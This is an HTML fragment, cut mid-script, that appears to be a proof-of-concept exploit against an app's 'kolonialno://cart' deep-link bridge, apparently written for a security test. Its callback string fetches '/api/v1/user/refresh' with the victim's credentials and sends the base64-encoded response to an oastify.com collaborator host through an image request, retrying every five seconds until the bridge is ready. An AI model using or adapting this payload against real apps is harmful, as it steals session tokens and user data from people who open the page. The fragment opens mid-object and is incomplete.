<html>
<script>

        url: "kolonialno://cart",
        callbackString: "fetch('/api/v1/user/refresh',{credentials:'include'})"
          + ".then(r=>r.text())"
          + ".then(d=>{new Image().src='https://gbv10jmu2wzkjr8zz4928u8lacg34ysn.oastify.com/leak?data='+btoa(d);});"
      }));
    } else {
      setTimeout(trigger, 5000); // retry sampai ready
    }

  trigger();
};
</script>
</html>
